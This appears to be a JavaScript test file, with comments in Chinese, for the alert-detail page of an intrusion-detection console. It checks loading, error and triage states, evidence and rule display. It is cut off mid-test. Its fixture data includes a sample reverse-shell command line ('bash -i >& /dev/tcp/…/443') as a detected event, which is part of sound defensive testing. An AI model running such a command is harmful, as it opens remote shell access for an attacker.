// pages/alert-detail.js —— 告警详情页：六格状态矩阵 + 真字段映射 + 三个动作 + A2 负向钉
// 字段一律照接口真名（cloudwalker.js:31-56 的 normalizeAlert、triage-monitor.js:91-96 的 status、
// investigation-agent.js:552-556 的 Investigation）。
import { test, beforeEach } from 'node:test';
import assert from 'node:assert/strict';

import {
  claimsOf,
  entityOf,
  formatClock,
  formatTime,
  missingEvidenceOf,
  mountAlertDetailPage,
  page,
  requiredEvidenceOf,
  stepsOf,
  verdictLabelOf,
} from '../../pages/alert-detail.js';
import { setCredentials, clearCredentials } from '../../src/credentials.js';
import { byRole, flush, setupDom, text } from '../dom.js';

let dom = null;

beforeEach(() => {
  dom = setupDom();
  clearCredentials();
  setCredentials({ user: 'hids', password: 'hids-2026' });
});

/** 本地时间造 ISO，formatTime 才可断言（页面按本地时区格式化，照稿） */
const iso = (...parts) => new Date(...parts).toISOString();
const NOW = new Date(2026, 10, 17, 9, 8, 7);

function alert(overrides = {}) {
  return {
    id: 'revshell:1', eventType: 'revshell', eventId: 200341, hostId: 3,
    createdAt: iso(2026, 10, 13, 9, 41, 12), time: '09:41:12',
    title: '反弹 Shell 外联', level: '高危', levelKey: 'high',
    asset: 'web-prod-03', assetIp: '172.16.221.41', source: '172.16.221.41', target: '45.32.118.7',
    account: 'deploy', command: 'bash -i', verdict: '待研判', verdictKey: 'review', coverage: null, cases: 0,
    scenario: '反弹 Shell', detail: '已读取牧云事件详情；证据仅为原始字段，尚未形成 AI 结论。',
    evidence: ['牧云 反弹 Shell 事件 #200341'], gap: '需核查会话授权…', state: null, triage: null,
    ...overrides,
  };
}

const DETAIL = {
  cmdline: 'bash -i >& /dev/tcp/45.32.118.7/443 0>&1',
  host: { host_name: 'web-prod-03', host_ip: '172.16.221.41' },
  process_tree: ['nginx', '/bin/sh'],
};

function triage(overrides = {}) {
  return {
    alert_id: 'revshell:1', matched_alert_id: null, status: 'done', stage: '研判完成',
    detail: 'nginx 工作进程派生 /bin/sh 并对外连接',
    created_at: iso(2026, 10, 13, 9, 41, 2), updated_at: iso(2026, 10, 13, 9, 44, 2),
    saved_at: iso(2026, 10, 13, 9, 44, 2),
    verdict: 'threat', verdict_label: '真实威胁',
    summary: 'nginx 工作进程派生 /bin/sh 并对外连接。',
    report: '目标主机上的 nginx 工作进程在 09:38 拉起 /bin/sh，并向外部地址建立 443 端口连接。',
    missing_evidence: ['操作者身份', '横向移动范围'], next_actions: ['排查同网段外联'],
    evidence_refs: [{ evidence_id: 'cw:2', pointer: '/cmdline' }],
    verified_facts: 4, evidence_sources: 6, decision_source: 'ai', rule_id: null,
    steps: [
      { stage: '关联事件', detail: '优先按事件 ID 精确读取牧云详情', at: iso(2026, 10, 13, 9, 41, 5) },
      { stage: '研判完成', detail: '研判记录已保存', at: iso(2026, 10, 13, 9, 44, 2) },
    ],
    ...overrides,
  };
}

function investigation(overrides = {}) {
  return {
    alert_id: 'revshell:1', mode: 'triage', saved_at: iso(2026, 10, 13, 9, 44, 2),
    verdict: {
      verdict: 'threat', verdict_label: '真实威胁', confidence: '高', risk_level: '高',
      summary: 'nginx 工作进程派生 /bin/sh 并对外连接，文件与网络证据一致。',
      report: '目标主机上的 nginx 工作进程在 09:38 拉起 /bin/sh。',
      claims: [
        { text: 'nginx 工作进程派生了 /bin/sh 子进程', citations: [{ evidence_id: 'cw:2', pointer: '/process_tree/0', value: 'nginx' }] },
        {
          text: '外联地址不属于业务出口白名单',
          citations: [{ evidence_id: 'cw:4', pointer: '/remote_addr', value: '45.32.118.7' }, { evidence_id: 'cw:4', pointer: '/dst_port', value: 443 }],
        },
      ],
      missing_evidence: ['操作者身份'],
    },
    review: { assessment: 'supported', concerns: ['未见登录会话记录'], missing_evidence: [] },
    validation: { ok: true, errors: [] },
    trace: [{ kind: 'tool', tool: 'list_host_events', evidence_id: 'cw:2' }],
    required_evidence: [
      { id: 'related_events', label: '同主机关联事件', tool: 'list_host_events', scope: '同主机指定类型的当前返回页', status: 'records_returned', returned_count: 3 },
      {
        id: 'file_invocation', label: '文件调用或对应 Web 请求', tool: 'web_request_or_file_access_log',
        scope: '仅检测到可疑文件不能证明文件已被请求或执行', status: 'source_unavailable',
        reason: '当前只读取证工具未接入对应 Web 请求或文件访问日志',
      },
    ],
    evidence: [
      { evidence_id: 'cw:2', tool: 'list_host_events', args: {}, fetched_at: iso(2026, 10, 13, 9, 41, 7), sha256: 'abc' },
      { evidence_id: 'cw:4', tool: 'list_firewall_connection_records', args: {}, fetched_at: iso(2026, 10, 13, 9, 41, 9), sha256: 'def' },
    ],
    ...overrides,
  };
}

const BOARD = {
  id: 'revshell:1', nodes: [
    { id: 'asset:172.16.221.41', kind: 'asset', label: '172.16.221.41', address: '172.16.221.41' },
    { id: 'ip:45.32.118.7', kind: 'external_ip', label: '45.32.118.7', address: '45.32.118.7' },
  ],
};

function respond(body, status = 200) {
  return { status, ok: status >= 200 && status < 300, json: async () => body };
}

const MISSING = respond({ error: '该告警暂无已保存的研判记录' }, 404);

/**
 * 起页面。默认三块数据都齐全；handler 可以按 URL 覆盖任意一条回包。
 * @returns {{ host: HTMLElement, calls: {url: string, method: string}[] }}
 */
function mount({
  params = ['revshell%3A1'],
  alertBody = { alert: alert(), detail: DETAIL },
  alertStatus = 200,
  triageRecord = triage(),
  triageStatus = 200,
  triagePost = null,
  investigationBody = investigation(),
  investigationStatus = 200,
  board = BOARD,
  ruleBody = null,
  handler,
} = {}) {
  const calls = [];
  const fetchImpl = async (url, init) => {
    const target = String(url);
    const method = init?.method ?? 'GET';
    calls.push({ url: target, method });
    if (handler) {
      const custom = await handler(target, init);
      if (custom !== undefined) return custom;
    }
    if (target.startsWith('/api/alerts/')) return alertStatus === 200 ? respond(alertBody) : respond({ error: 'x' }, alertStatus);
    if (target.startsWith('/api/agent/triage/')) {
      if (method === 'POST') return triagePost ?? respond({ ...triage(), status: 'queued', stage: '等待研判' }, 202);
      return triageStatus === 200 ? respond(triageRecord) : respond({ error: 'x' }, triageStatus);
    }
    if (target.startsWith('/api/agent/investigations/')) {
      if (investigationStatus !== 200) return respond({ error: 'x' }, investigationStatus);
      const mode = new URL(target, 'http://x').searchParams.get('mode');
      const body = typeof investigationBody === 'function' ? investigationBody(mode) : investigationBody;
      return body === null ? MISSING : respond(body);
    }
    if (target.startsWith('/api/trace/boards/')) return board === null ? respond({ error: 'x' }, 404) : respond(board);
    if (target.startsWith('/api/rules/')) return ruleBody === null ? respond({ error: '规则不存在' }, 404) : respond(ruleBody);
    return respond({ error: '未预期的请求' }, 500);
  };
  const host = mountAlertDetailPage(params, { fetchImpl, now: () => NOW });
  document.body.append(host);
  return { host, calls };
}

/** 用户看得见的文本：把 [hidden] 子树整块剔掉（隐藏区块的 textContent 不算用户可见） */
function visibleText(host) {
  const clone = host.cloneNode(true);
  for (const node of clone.querySelectorAll('[hidden]')) node.remove();
  return (clone.textContent ?? '').replace(/\s+/g, ' ').trim();
}

const region = (host, role) => host.querySelector(`[data-role="${role}"]`);
const button = (host, name) => byRole(host, 'button', name);
const link = (host, name) => byRole(host, 'link', name);
const statValue = (host, role) => text(region(host, role));

// ---------- 六格状态矩阵 ----------

test('格 1「加载中」：挂载即出「正在读取告警…」，刷新禁用、业务区不出现；取到后撤掉', async () => {
  const { host } = mount();

  assert.equal(region(host, 'loading').hidden, false);
  assert.match(visibleText(host), /正在读取告警…/);
  assert.equal(region(host, 'main').hidden, true);
  assert.equal(button(host, /刷新/).disabled, true);
  assert.equal(button(host, '复制告警 ID').disabled, true);

  await flush();

  assert.equal(region(host, 'loading').hidden, true);
  assert.equal(region(host, 'main').hidden, false);
  assert.equal(button(host, /刷新/).disabled, false);
  assert.doesNotMatch(visibleText(host), /正在读取告警…/);
});

test('格 2「空态（未研判）」：结论「待研判」，缺口/依据/证据/关联实体整块隐藏，不编数据', async () => {
  const { host } = mount({
    triageRecord: { alert_id: 'revshell:1', status: 'not_queued' },
    investigationBody: null,
    board: null,
  });
  await flush();

  const shown = visibleText(host);
  assert.match(shown, /待研判/);
  assert.match(shown, /这条告警还没有研判结论。/);
  assert.match(shown, /未入队/);
  assert.match(shown, /还没有研判步骤。加入队列后这里会出现模型的执行记录。/);
  // 没有研判数据时这四块不许露面（稿有、接口没有数据 → 藏）
  for (const absent of ['结论依据', '缺失证据', '关联实体']) {
    assert.doesNotMatch(shown, new RegExp(absent), `${absent} 在没有数据时不该出现`);
  }
  assert.equal(region(host, 'evidence-block').hidden, true, '证据来源区块没有条目时整块藏');
  // 核验区保留稿的「尚未核验」说明，但不画任何核验行
  assert.match(shown, /尚未核验/);
  assert.equal(region(host, 'validation').children.length, 0);
  // 概况条：状态如实，事实/来源/缺口不拿 0 充数
  assert.equal(statValue(host, 'stat-facts'), '—');
  assert.equal(statValue(host, 'stat-sources'), '—');
  assert.equal(statValue(host, 'stat-gaps'), '—');
  assert.equal(statValue(host, 'stat-mode'), '—');
  assert.equal(button(host, '加入研判队列').disabled, false);
});

test('格 3「部分失败（partial）」：研判记录读不到时页面主体照常，状态写「读取失败」、入队禁用', async () => {
  const { host } = mount({ triageStatus: 502 });
  await flush();

  const shown = visibleText(host);
  assert.match(shown, /反弹 Shell 外联/);          // 告警本体在
  assert.match(shown, /真实威胁/);                  // 研判结果在
  assert.match(shown, /研判记录读取失败：服务返回 502/);
  assert.equal(statValue(host, 'stat-status'), '读取失败');
  assert.doesNotMatch(shown, /未入队/);             // 读不到 ≠ 未入队
  const queue = button(host, '研判状态未知');
  assert.equal(queue.disabled, true);
});

test('格 3b「牧云读不到不算整页失败」：告警本体 502 → 研判记录照常显示，题干说明没有原始事件', async () => {
  const { host, calls } = mount({
    handler: async target => (target.startsWith('/api/alerts/') ? respond({ error: '牧云请求失败' }, 502) : undefined),
  });
  await flush();

  assert.equal(region(host, 'main').hidden, false, '研判记录在，正文要渲染');
  assert.match(text(region(host, 'note')), /牧云事件没有读到/);
  const shown = visibleText(host);
  assert.match(shown, /真实威胁/);
  assert.match(shown, /nginx 工作进程派生了 \/bin\/sh 子进程/);
  assert.equal(calls.some(call => call.url.startsWith('/api/agent/triage/')), true);
});

test('格 4「错误」：研判记录与牧云事件都读不到 → 整页错误块 + 重试，重试后恢复', async () => {
  let fail = true;
  const { host, calls } = mount({
    handler: async target => {
      if (!fail) return undefined;
      if (target.startsWith('/api/agent/triage/') && !target.includes('/false-positive')) return respond({ error: '读失败' }, 502);
      if (target.startsWith('/api/alerts/')) return respond({ error: '牧云请求失败' }, 502);
      return undefined;
    },
  });
  await flush();

  const alertBox = byRole(host, 'alert', /服务返回异常/);
  assert.ok(alertBox, '错误块要有 role=alert');
  assert.equal(region(host, 'main').hidden, true);
  assert.equal(region(host, 'error').hidden, false);

  fail = false;
  const before = calls.length;
  button(host, '重试').click();
  await flush();

  assert.ok(calls.length > before, '重试要真的再发请求');
  assert.equal(region(host, 'error').hidden, true);
  assert.match(visibleText(host), /反弹 Shell 外联/);
});

test('格 4b「400」：ID 或事件类型无效 → 未找到块，正文不渲染，给返回链接', async () => {
  const { host } = mount({
    params: ['nosuch:1'],
    handler: async target => ((target.startsWith('/api/alerts/') || target.startsWith('/api/agent/triage/'))
      ? respond({ error: '不支持的事件类型' }, 400) : undefined),
  });
  await flush();

  const shown = visibleText(host);
  assert.match(shown, /没有找到这条告警/);
  assert.match(shown, /nosuch:1/);
  assert.equal(region(host, 'main').hidden, true);
  assert.equal(link(host, '返回告警列表').getAttribute('href'), '#/alerts');
});

test('格 4c「没有 ID」：params 为空 → 未找到块说「链接里没有告警 ID」，不发请求', async () => {
  const { host, calls } = mount({ params: [] });
  await flush();

  assert.match(visibleText(host), /链接里没有告警 ID/);
  assert.equal(calls.length, 0);
});

test('格 5「超长内容」：200 字标题与长报告原样渲染，不截断、不加省略号', async () => {
  const longTitle = '超长标题'.repeat(50);
  const longReport = '这是一段很长的研判报告。'.repeat(40);
  const longDetail = { description: '原始字段值'.repeat(200) };
  const { host } = mount({
    alertBody: { alert: alert({ title: longTitle }), detail: longDetail },
    triageRecord: triage({ report: longReport }),
    investigationBody: investigation({ verdict: { ...investigation().verdict, report: longReport } }),
  });
  await flush();

  assert.equal(text(region(host, 'title')), longTitle);
  const shown = visibleText(host);
  assert.ok(shown.includes(longTitle), '标题要整段在页面上');
  assert.ok(shown.includes(longReport), '报告要整段在页面上');
  assert.ok(shown.includes(longDetail.description), '原始字段值要整段在页面上');
  assert.equal(text(host.querySelector('[data-role="json"]')).includes(longDetail.description), true);
});

test('研判失败且没有旧结论时：结论位写「待研判」+「研判失败，暂无结论。」', async () => {
  const { host } = mount({
    triageRecord: triage({ status: 'failed', stage: '研判失败', verdict: null, verdict_label: null, report: null, missing_evidence: [] }),
    investigationBody: null,
  });
  await flush();

  assert.equal(text(region(host, 'verdict')), '待研判');
  assert.equal(region(host, 'verdict-note').hidden, false);
  assert.match(text(region(host, 'verdict-note')), /研判失败，暂无结论。/);
  assert.equal(statValue(host, 'stat-status'), '研判失败');
});

test('研判失败但上一次研判结果还在：照画旧结论，不写「暂无结论」', async () => {
  const { host } = mount({ triageRecord: triage({ status: 'failed', stage: '研判失败', verdict: null, verdict_label: null }) });
  await flush();

  assert.equal(text(region(host, 'verdict')), '真实威胁');
  assert.equal(region(host, 'verdict-note').hidden, true);
  assert.equal(statValue(host, 'stat-status'), '研判失败');
});

test('格 6「禁用」：研判中入队按钮禁用并写「已在队列中」，对应状态行标 is-queued', async () => {
  const { host } = mount({ triageRecord: triage({ status: 'running', stage: '研判中', verdict_label: null }) });
  await flush();

  const queue = button(host, '已在队列中');
  assert.ok(queue);
  assert.equal(queue.disabled, true);
  assert.equal(region(host, 'state').className, 'state is-queued');
  assert.equal(statValue(host, 'stat-status'), '研判中');
});

// ---------- 真字段映射（A1 正向） ----------

test('头部：等级/类型/标题/资产/IP/时间/事件ID/主机ID 全部来自 alert 真字段', async () => {
  const { host } = mount();
  await flush();

  assert.equal(text(region(host, 'level')), '高危');
  assert.equal(region(host, 'level').className, 'level is-high');
  assert.equal(text(region(host, 'type')), '反弹 Shell');
  assert.equal(text(region(host, 'title')), '反弹 Shell 外联');
  // 页级 h1 在壳里（「告警详情」），内容区不许再出第二个一级标题
  assert.equal(host.querySelectorAll('h1').length, 0);
  const meta = text(region(host, 'meta'));
  for (const part of ['web-prod-03', '172.16.221.41', '2026-11-13 09:41:12', '#200341', '#3']) {
    assert.ok(meta.includes(part), `头部元信息缺少 ${part}`);
  }
  // 场景 = 类型中文名，不单列（稿映射 scenario，与「类型」重复）
  assert.equal(meta.includes('反弹 Shell'), false);
});

test('概况条六格：事实/来源/依据/缺口/状态/模式，缺口取 missing_evidence 条数', async () => {
  const { host } = mount();
  await flush();

  assert.equal(statValue(host, 'stat-facts'), '4');
  assert.equal(statValue(host, 'stat-sources'), '6');
  assert.equal(statValue(host, 'stat-claims'), '2');
  assert.equal(statValue(host, 'stat-gaps'), '2');   // triage.missing_evidence 两条
  assert.equal(statValue(host, 'stat-status'), '已完成');
  assert.equal(statValue(host, 'stat-mode'), '常规研判');
});

test('结论：标签取 verdict_label（三值），摘要与报告来自研判结果/研判记录', async () => {
  const { host } = mount();
  await flush();

  assert.equal(text(region(host, 'verdict')), '真实威胁');
  assert.equal(region(host, 'verdict').className, 'verdict is-threat');
  assert.match(text(region(host, 'summary')), /文件与网络证据一致/);
  assert.match(text(region(host, 'report')), /拉起 \/bin\/sh/);
});

test('结论依据：claims 的 text 原样，引用数按 citations 的 evidence_id 去重，不编「已证实」', async () => {
  const { host } = mount();
  await flush();

  const claims = [...host.querySelectorAll('.claim')];
  assert.equal(claims.length, 2);
  assert.match(text(claims[0]), /nginx 工作进程派生了 \/bin\/sh 子进程/);
  assert.match(text(claims[0]), /引用 1 处证据/);
  assert.match(text(claims[0]), /cw:2/);
  assert.match(text(claims[1]), /引用 1 处证据/);   // 两条 citation 同一个 evidence_id → 去重
  const shown = visibleText(host);
  assert.doesNotMatch(shown, /已证实/);
  assert.doesNotMatch(shown, /存疑/);
});

test('结论依据：有引用与零引用用两个状态类，零引用不借强调色（is-plain 走次要文字色）', async () => {
  const withRefs = investigation();
  const { host } = mount({
    investigationBody: investigation({
      verdict: {
        ...withRefs.verdict,
        claims: [
          withRefs.verdict.claims[0],
          { text: '外联地址不属于业务出口白名单', citations: [] },
        ],
      },
    }),
  });
  await flush();

  const states = [...host.querySelectorAll('.claim-state')];
  assert.equal(states.length, 2);
  assert.equal(states[0].className, 'claim-state is-confirmed');
  assert.equal(text(states[0]), '引用 1 处证据');
  assert.equal(states[1].className, 'claim-state is-plain');
  assert.equal(text(states[1]), '未引用证据');
  // 零引用不给引用编号：refs 为空时 .claim-ref 不出
  assert.equal(host.querySelectorAll('.claim-ref').length, 1);
});

test('所需证据：五值 status 照实写，不压成「已具备/缺失」；reason 进 title', async () => {
  const { host } = mount();
  await flush();

  const items = [...host.querySelectorAll('.check-item')];
  assert.equal(items.length, 2);
  assert.match(text(items[0]), /同主机关联事件/);
  assert.match(text(items[0]), /已取到记录/);
  assert.match(text(items[1]), /工具未接入/);
  assert.match(items[1].getAttribute('title'), /只读取证工具未接入对应 Web 请求/);
  assert.equal(text(region(host, 'required-meta')), '1 / 2 已取到');
  const shown = visibleText(host);
  assert.doesNotMatch(shown, /已具备/);
  assert.equal(text(items[1]).includes('缺失'), false, '五值状态不压成「缺失」二字');
});

test('研判步骤：只有 stage / detail / at（真键），没有工具名与耗时列', async () => {
  const { host } = mount();
  await flush();

  const steps = [...host.querySelectorAll('.step')];
  assert.equal(steps.length, 2);
  assert.match(text(steps[0]), /关联事件/);
  assert.match(text(steps[0]), /优先按事件 ID 精确读取牧云详情/);
  assert.match(text(steps[0]), /09:41:05/);
  assert.equal(host.querySelectorAll('.step-tool').length, 0);
  assert.doesNotMatch(visibleText(host), /0\.4s|6\.8s/);
});

test('证据来源：按 evidence[] 逐条渲染，按 tool 分组折叠（组名 + 条数），不编稿上的分类', async () => {
  const { host } = mount();
  await flush();

  const groups = [...host.querySelectorAll('details.ev-group')];
  assert.equal(groups.length, 2, '每个 tool 一组');
  assert.match(text(groups[0].querySelector('summary')), /list_host_events/);
  assert.match(text(groups[0].querySelector('summary')), /1 条/);
  const rows = [...host.querySelectorAll('.ev-item')];
  assert.equal(rows.length, 2);
  assert.match(text(rows[0]), /cw:2/);
  assert.match(text(rows[0]), /sha256 abc/, '条目没有事实文本，第三列给 sha256');
  assert.match(text(rows[1]), /cw:4/);
  assert.equal(text(region(host, 'evidence-meta')), '共 2 条');
  assert.doesNotMatch(visibleText(host), /进程类|网络类/, '不编设计稿上的证据分类');
});

test('证据来源：优先用研判记录里的 evidence[]（TriageCase），其次才是研判结果', async () => {
  const { host } = mount({
    triageRecord: triage({
      evidence: [{ evidence_id: 'cw:9', tool: 'read_file', fetched_at: iso(2026, 10, 13, 9, 45, 0), sha256: 'ffff' }],
    }),
  });
  await flush();
  const rows = [...host.querySelectorAll('.ev-item')];
  assert.equal(rows.length, 1, '有 triage.evidence 时不再回落到 investigation.evidence');
  assert.match(text(rows[0]), /cw:9/);
  assert.match(text(host.querySelector('details.ev-group summary')), /read_file/);
});

test('证据链对账：claim 的 citation 与条目对得上时不出告警文案', async () => {
  const { host } = mount();
  await flush();
  assert.equal(host.querySelectorAll('.claim-ref .is-missing').length, 0);
  assert.equal(region(host, 'evidence-note').hidden, true);
});

test('证据链对账：citation 引用的 evidence_id 不在条目里时，标红并给出缺失条数', async () => {
  const { host } = mount({
    investigationBody: investigation({
      verdict: {
        verdict: 'threat', verdict_label: '真实威胁', summary: 's', report: 'r',
        claims: [{ text: '引用了不存在的证据', citations: [{ evidence_id: 'cw:99', pointer: '/x', value: 1 }] }],
        missing_evidence: [],
      },
    }),
  });
  await flush();
  const missing = [...host.querySelectorAll('.claim-ref .is-missing')];
  assert.equal(missing.length, 1, '对不上的引用要看得见');
  assert.equal(text(missing[0]), 'cw:99');
  assert.match(text(region(host, 'claims')), /1 处引用在证据条目中找不到/);
  assert.equal(region(host, 'evidence-note').hidden, false);
  assert.match(text(region(host, 'evidence-note')), /证据链不完整/);
});

test('核验与复核：只画 validation / review 的真键，没有复核人/复核时间', async () => {
  const { host } = mount();
  await flush();

  const validation = text(region(host, 'validation'));
  assert.match(validation, /引用校验/);
  assert.match(validation, /通过/);
  const review = text(region(host, 'review-kv'));
  assert.match(review, /独立复核/);
  assert.match(review, /支持原结论/);
  assert.match(review, /未见登录会话记录/);
  const shown = visibleText(host);
  for (const absent of ['复核人', '复核时间', '复核结论', '复核备注']) {
    assert.doesNotMatch(shown, new RegExp(absent), `${absent}：接口没有这个字段，不许画`);
  }
});

test('校验未通过时：依据格写明未通过，核验区给错误条数', async () => {
  const { host } = mount({
    investigationBody: investigation({ validation: { ok: false, errors: ['/process_tree/0 值不匹配'], removed_unverified_facts: true } }),
  });
  await flush();

  assert.equal(statValue(host, 'stat-claims'), '2 · 未通过校验');
  const validation = text(region(host, 'validation'));
  assert.match(validation, /未通过/);
  assert.match(validation, /校验错误\s*1 条/);
  assert.match(validation, /移除未核验事实\s*是/);
});

test('关联实体：节点取 TraceBoard.nodes 的 kind / label，未登记的 kind 原样显示', async () => {
  const { host } = mount({
    board: { id: 'revshell:1', nodes: [{ id: 'x:1', kind: 'account', label: 'deploy' }] },
  });
  await flush();

  const entities = [...host.querySelectorAll('.entity')];
  assert.equal(entities.length, 1);
  assert.match(text(entities[0]), /account/);
  assert.match(text(entities[0]), /deploy/);
  assert.equal(text(region(host, 'entities-meta')), '1 个');
});

test('原始事件：details 默认收起；展开后按 detail 的实际 key 分组 + 原始 JSON', async () => {
  const { host } = mount();
  await flush();

  const raw = region(host, 'raw');
  assert.equal(raw.tagName, 'DETAILS');
  assert.equal(raw.open, false, '稿要求默认收起：页面不带 open 属性');
  assert.equal(raw.hasAttribute('open'), false);

  raw.open = true;
  assert.equal(text(region(host, 'detail')).includes('bash -i >& /dev/tcp'), true);
  assert.equal(text(region(host, 'detail')).includes('host_name'), true);
  const json = JSON.parse(text(region(host, 'json')));
  assert.equal(json.cmdline, DETAIL.cmdline);
});

// ---------- 交互 ----------

test('入队：点「加入研判队列」发 POST，回包状态上位，按钮转禁用并播报', async () => {
  const { host, calls } = mount({ triageRecord: { alert_id: 'revshell:1', status: 'not_queued' }, investigationBody: null });
  await flush();

  button(host, '加入研判队列').click();
  await flush();

  const post = calls.find(call => call.method === 'POST');
  assert.ok(post, '必须真的发 POST');
  assert.equal(post.url, '/api/agent/triage/revshell%3A1');
  assert.equal(button(host, '已在队列中').disabled, true);
  assert.match(text(region(host, 'note')), /已提交研判：revshell:1/);
});

test('入队失败：播报失败原因，按钮恢复可点（不乐观改状态）', async () => {
  const { host } = mount({
    triageRecord: { alert_id: 'revshell:1', status: 'not_queued' },
    investigationBody: null,
    triagePost: respond({ error: '自动研判尚未配置' }, 503),
  });
  await flush();

  button(host, '加入研判队列').click();
  await flush();

  assert.match(text(region(host, 'note')), /提交失败：服务端尚未配置自动研判。/);
  assert.equal(button(host, '加入研判队列').disabled, false);
  assert.equal(statValue(host, 'stat-status'), '未入队');
});

test('复制：成功后播报「已复制 <ID>」，剪贴板不可用时给手动选择提示', async () => {
  const { host } = mount();
  await flush();
  const copied = [];
  Object.defineProperty(globalThis, 'navigator', { value: dom.window.navigator, configurable: true });
  dom.window.navigator.clipboard = { writeText: async value => copied.push(value) };

  button(host, '复制告警 ID').click();
  await flush();

  assert.deepEqual(copied, ['revshell:1']);
  assert.match(text(region(host, 'note')), /已复制 revshell:1/);

  dom.window.navigator.clipboard = undefined;
  button(host, '复制告警 ID').click();
  await flush();
  assert.match(text(region(host, 'note')), /复制失败，请手动选择 revshell:1/);
});

test('刷新：重新发一轮取数请求并播报；深度溯源是带编码 ID 的真链接', async () => {
  const { host, calls } = mount();
  await flush();
  const first = calls.length;

  button(host, /刷新/).click();
  await flush();
  assert.ok(calls.length > first, '刷新要真的重取');
  assert.equal(calls.at(-1).url.startsWith('/api/'), true);

  assert.equal(link(host, '深度溯源').getAttribute('href'), '#/trace/revshell%3A1');
  assert.equal(link(host, '← 告警列表').getAttribute('href'), '#/alerts');
});

test('page 契约：id / title / navLabel 不变，render 从 params[0] 取 ID 并解码', async () => {
  assert.equal(page.id, 'alert-detail');
  assert.equal(page.title, '告警详情');
  assert.equal(page.navLabel, null);

  const content = document.createElement('div');
  const urls = [];
  const original = globalThis.fetch;
  globalThis.fetch = async url => {   // render 不注入 options：只用全局 fetch（真机路径）
    urls.push(String(url));
    return respond({ alert: alert(), detail: DETAIL });
  };
  try {
    page.render(content, { params: ['revshell%3A1'] });
    await flush();
  } finally {
    globalThis.fetch = original;
  }
  assert.ok(urls.includes('/api/alerts/revshell%3A1'), `实际请求：${urls.join(', ')}`);
  assert.equal(text(content.querySelector('[data-role="title"]')), '反弹 Shell 外联');
});

// ---------- A3：短结果 / 命中的 Rego / 用过的 wiki / 证据 ----------

test('A3 短结果：研判摘要与报告整段在页面上（summary 是 500 字内的结论摘要）', async () => {
  const summary = 'nginx 工作进程派生 /bin/sh 并对外连接，文件与网络证据一致。'.repeat(3);
  const { host } = mount({ investigationBody: investigation({ verdict: { ...investigation().verdict, summary } }) });
  await flush();
  const shown = visibleText(host);
  assert.ok(shown.includes(summary.trim()), '短结果要整段出现');
  assert.match(shown, /目标主机上的 nginx 工作进程在 09:38 拉起/);
});

test('A3 短结果：研判结果读不到时，退回研判记录上的 summary（不把结论空着）', async () => {
  const { host } = mount({
    investigationBody: null,
    triageRecord: triage({ summary: '研判记录里的结论摘要，500 字以内。' }),
  });
  await flush();
  assert.match(visibleText(host), /研判记录里的结论摘要/);
});

test('A3 命中的规则：规则名 + 整份 Rego 原文（GET /api/rules/{id}）', async () => {
  const rego = 'package hids.rules.ssh_bruteforce\n\n# name: SSH 暴力破解\ndefault allow := false';
  const { host, calls } = mount({
    triageRecord: triage({ rule_id: 'ssh_bruteforce' }),
    investigationBody: investigation({ verdict: { ...investigation().verdict, rego: { status: 'matched', rule_ids: ['ssh_bruteforce'] } } }),
    ruleBody: { id: 'ssh_bruteforce', name: 'SSH 暴力破解', description: '', file: 'ssh_bruteforce.rego', rego },
  });
  await flush();

  assert.equal(calls.some(call => call.url === '/api/rules/ssh_bruteforce'), true, '命中了才去读规则原文');
  const line = text(region(host, 'rule-line'));
  assert.match(line, /命中 ssh_bruteforce/);
  assert.match(line, /SSH 暴力破解/);
  const pre = region(host, 'rule-rego');
  assert.equal(pre.hidden, false);
  assert.equal(pre.textContent, rego);
  assert.match(visibleText(host), /package hids\.rules\.ssh_bruteforce/);
});

test('A3 没有套上：规则评估结果 none → 详情写「没有套上」，不发规则请求', async () => {
  const { host, calls } = mount({
    investigationBody: investigation({ verdict: { ...investigation().verdict, rego: { status: 'none', rule_ids: [] } } }),
  });
  await flush();
  assert.equal(text(region(host, 'rule-line')), '没有套上');
  assert.equal(region(host, 'rule-rego').hidden, true);
  assert.equal(calls.some(call => call.url.startsWith('/api/rules/')), false);
});

test('A3 规则原文读不到（404）：仍写命中哪条，并说明规则库里已没有这条', async () => {
  const { host } = mount({
    triageRecord: triage({ rule_id: 'gone_rule' }),
    investigationBody: investigation({ verdict: { ...investigation().verdict, rego: { status: 'matched', rule_ids: ['gone_rule'] } } }),
  });
  await flush();
  assert.match(text(region(host, 'rule-line')), /命中 gone_rule/);
  assert.equal(text(region(host, 'rule-meta')), '规则库里已没有这条');
  assert.equal(region(host, 'rule-rego').hidden, true);
});

test('A3 用过的 wiki：采纳页逐条列出，没采纳时写原因；查阅数进 meta', async () => {
  const { host } = mount({
    investigationBody: investigation({
      verdict: {
        ...investigation().verdict,
        wiki: { consulted: ['honeypot/HP-10.md', 'common/CM-1.md'], adopted: ['honeypot/HP-10.md'], reason: '本页判据与本次蜜罐触发条件一致' },
      },
    }),
  });
  await flush();
  assert.equal(text(region(host, 'wiki-meta')), '查阅 2 页');
  const items = [...region(host, 'wiki-list').querySelectorAll('li')].map(item => text(item));
  assert.deepEqual(items, ['honeypot/HP-10.md']);
  assert.match(text(region(host, 'wiki-note')), /判据与本次蜜罐触发条件一致/);

  const noAdopt = mount({
    investigationBody: investigation({
      verdict: { ...investigation().verdict, wiki: { consulted: [], adopted: [], reason: '牧云事件未匹配，本轮是降级结论，没有工具循环，未采纳判据页' } },
    }),
  });
  await flush();
  assert.equal(noAdopt.host.querySelectorAll('[data-role="wiki-list"] li').length, 0);
  assert.match(text(region(noAdopt.host, 'wiki-note')), /未采纳判据页/);
});

test('A3 证据：研判记录的 evidence[] 逐条列出（tool 分组 + evidence_id）', async () => {
  const { host } = mount({
    triageRecord: triage({
      evidence: [
        { evidence_id: 'syslog:1', tool: 'syslog', fetched_at: iso(2026, 10, 13, 9, 41, 2), sha256: 'a'.repeat(64) },
        { evidence_id: 'cw:2', tool: 'list_host_events', fetched_at: iso(2026, 10, 13, 9, 41, 7), sha256: 'b'.repeat(64) },
      ],
    }),
  });
  await flush();
  assert.equal(text(region(host, 'evidence-meta')), '共 2 条');
  const groups = [...region(host, 'evidence').querySelectorAll('details')].map(node => text(node.querySelector('summary')));
  assert.deepEqual(groups, ['syslog1 条', 'list_host_events1 条']);
  assert.match(text(region(host, 'evidence')), /syslog:1/);
  assert.match(text(region(host, 'evidence')), /cw:2/);
});

test('A3 推送 ID 对不上牧云事件号：详情照样打开这条研判，标题用类型 + 主机，不去牧云认 ID', async () => {
  const caseId = 'syslog%3Ahoneypot%3A0123456789abcdef%3A1732000000%3A11111111-2222-3333-4444-555555555555';
  const { host, calls } = mount({
    params: [caseId],
    triageRecord: triage({
      alert_id: 'syslog:honeypot:0123456789abcdef:1732000000:11111111-2222-3333-4444-555555555555',
